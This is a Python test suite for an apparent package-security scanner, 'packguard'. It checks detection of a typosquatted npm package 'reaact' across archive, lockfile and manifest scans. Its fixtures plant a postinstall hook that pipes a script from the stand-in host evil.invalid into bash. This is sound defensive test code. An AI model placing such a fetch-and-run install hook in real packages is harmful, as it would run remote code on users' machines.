import json
import logging
import os
import sys
import tempfile
import unittest
from base64 import b64encode
from hashlib import sha512

sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(__file__)), "src"))

from packguard.config import Config
from packguard.engine.pipeline import ScanPipeline


def _build_npm_tarball(path: str, package_name: str, postinstall_command: str, source_body: str):
    import tarfile

    package_json = {
        "name": package_name,
        "version": "1.0.0",
        "scripts": {"postinstall": postinstall_command},
    }
    with tempfile.TemporaryDirectory() as tmpdir:
        package_dir = os.path.join(tmpdir, "package")
        os.makedirs(package_dir, exist_ok=True)
        with open(os.path.join(package_dir, "package.json"), "w", encoding="utf-8") as handle:
            json.dump(package_json, handle)
        with open(os.path.join(package_dir, "index.js"), "w", encoding="utf-8") as handle:
            handle.write(source_body)
        with tarfile.open(path, "w:gz") as archive:
            archive.add(package_dir, arcname="package")


def _sha512_sri(path: str) -> str:
    with open(path, "rb") as handle:
        digest = sha512(handle.read()).digest()
    return f"sha512-{b64encode(digest).decode('ascii')}"


class DetectorTestCase(unittest.TestCase):
    def setUp(self):
        self.logger = logging.getLogger("packguard-test")
        self.logger.handlers = []
        self.logger.addHandler(logging.NullHandler())

    def test_pipeline_scans_archive_and_writes_report(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            report_path = os.path.join(tmpdir, "report.json")
            tarball_path = os.path.join(tmpdir, "reaact-1.0.0.tgz")
            _build_npm_tarball(
                tarball_path,
                package_name="reaact",
                postinstall_command="curl https://evil.invalid/bootstrap.sh | bash",
                source_body="eval('steal')",
            )
            config = Config(
                popular_packages_path=os.path.join(
                    os.path.dirname(os.path.dirname(__file__)),
                    "data/intel/popular_packages.txt",
                ),
                malicious_feed_path=os.path.join(
                    os.path.dirname(os.path.dirname(__file__)),
                    "data/intel/malicious_packages.json",
                ),
            )
            pipeline = ScanPipeline(config, self.logger)
            result = pipeline.scan_archive(
                path=tarball_path,
                source="npm",
                name="reaact",
                version="1.0.0",
            )
            pipeline.write_report([result], report_path)

            self.assertEqual(result.verdict, "malicious")
            self.assertTrue(any(f.rule_id == "name.typosquat" for f in result.findings))
            self.assertTrue(any(f.rule_id == "behavior.install-script" for f in result.findings))
            self.assertTrue(any(f.rule_id == "static.exec-eval" for f in result.findings))

            with open(report_path, "r", encoding="utf-8") as handle:
                report = json.load(handle)

            self.assertEqual(report["total_packages"], 1)
            self.assertEqual(report["malicious_count"], 1)
            self.assertEqual(report["coverage_modes"], ["single-package"])

    def test_pipeline_blocks_network_resolution_in_offline_mode(self):
        config = Config(offline_mode=True)
        pipeline = ScanPipeline(config, self.logger)

        with self.assertRaises(ValueError):
            pipeline.scan_manifest("requirements.txt", "pypi")

    def test_pipeline_scans_package_lock_with_transitive_coverage(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            root_tarball = os.path.join(tmpdir, "rootdep-1.0.0.tgz")
            child_tarball = os.path.join(tmpdir, "reaact-1.0.0.tgz")
            _build_npm_tarball(
                root_tarball,
                package_name="rootdep",
                postinstall_command="echo preparing",
                source_body="console.log('ok')",
            )
            _build_npm_tarball(
                child_tarball,
                package_name="reaact",
                postinstall_command="curl https://evil.invalid/bootstrap.sh | bash",
                source_body="eval('steal')",
            )

            lockfile_path = os.path.join(tmpdir, "package-lock.json")
            with open(lockfile_path, "w", encoding="utf-8") as handle:
                json.dump(
                    {
                        "name": "demo",
                        "lockfileVersion": 3,
                        "packages": {
                            "": {"name": "demo", "version": "1.0.0"},
                            "node_modules/rootdep": {
                                "version": "1.0.0",
                                "resolved": root_tarball,
                                "integrity": _sha512_sri(root_tarball),
                            },
                            "node_modules/rootdep/node_modules/reaact": {
                                "version": "1.0.0",
                                "resolved": child_tarball,
                                "integrity": _sha512_sri(child_tarball),
                            },
                        },
                    },
                    handle,
                )

            config = Config(
                popular_packages_path=os.path.join(
                    os.path.dirname(os.path.dirname(__file__)),
                    "data/intel/popular_packages.txt",
                ),
                malicious_feed_path=os.path.join(
                    os.path.dirname(os.path.dirname(__file__)),
                    "data/intel/malicious_packages.json",
                ),
            )
            pipeline = ScanPipeline(config, self.logger)
            results = pipeline.scan_lockfile(lockfile_path)

            self.assertEqual(len(results), 2)
            child = next(result for result in results if result.package.coordinate.name == "reaact")
            self.assertEqual(child.package.coverage_mode, "fully-resolved")
            self.assertEqual(child.package.parent_name, "rootdep")
            self.assertEqual(child.package.depth, 2)
            self.assertEqual(child.metadata["integrity"]["status"], "verified")
            self.assertEqual(child.metadata["coverage_mode"], "fully-resolved")
            self.assertTrue(any(f.rule_id == "name.typosquat" for f in child.findings))

    def test_manifest_scan_prefers_sibling_package_lock(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            tarball_path = os.path.join(tmpdir, "reaact-1.0.0.tgz")
            _build_npm_tarball(
                tarball_path,
                package_name="reaact",
                postinstall_command="curl https://evil.invalid/bootstrap.sh | bash",
                source_body="eval('steal')",
            )
            package_json_path = os.path.join(tmpdir, "package.json")
            with open(package_json_path, "w", encoding="utf-8") as handle:
                json.dump({"name": "demo", "dependencies": {"reaact": "^1.0.0"}}, handle)
            package_lock_path = os.path.join(tmpdir, "package-lock.json")
            with open(package_lock_path, "w", encoding="utf-8") as handle:
                json.dump(
                    {
                        "name": "demo",
                        "lockfileVersion": 3,
                        "packages": {
                            "": {"name": "demo", "version": "1.0.0"},
                            "node_modules/reaact": {
                                "version": "1.0.0",
                                "resolved": tarball_path,
                                "integrity": _sha512_sri(tarball_path),
                            },
                        },
                    },
                    handle,
                )

            config = Config(
                popular_packages_path=os.path.join(
                    os.path.dirname(os.path.dirname(__file__)),
                    "data/intel/popular_packages.txt",
                ),
                malicious_feed_path=os.path.join(
                    os.path.dirname(os.path.dirname(__file__)),
                    "data/intel/malicious_packages.json",
                ),
            )
            pipeline = ScanPipeline(config, self.logger)
            results = pipeline.scan_manifest(package_json_path, "npm")

            self.assertEqual(len(results), 1)
            self.assertEqual(results[0].package.coverage_mode, "fully-resolved")
            self.assertEqual(results[0].package.resolution_source, "lockfile")


if __name__ == "__main__":
    unittest.main()
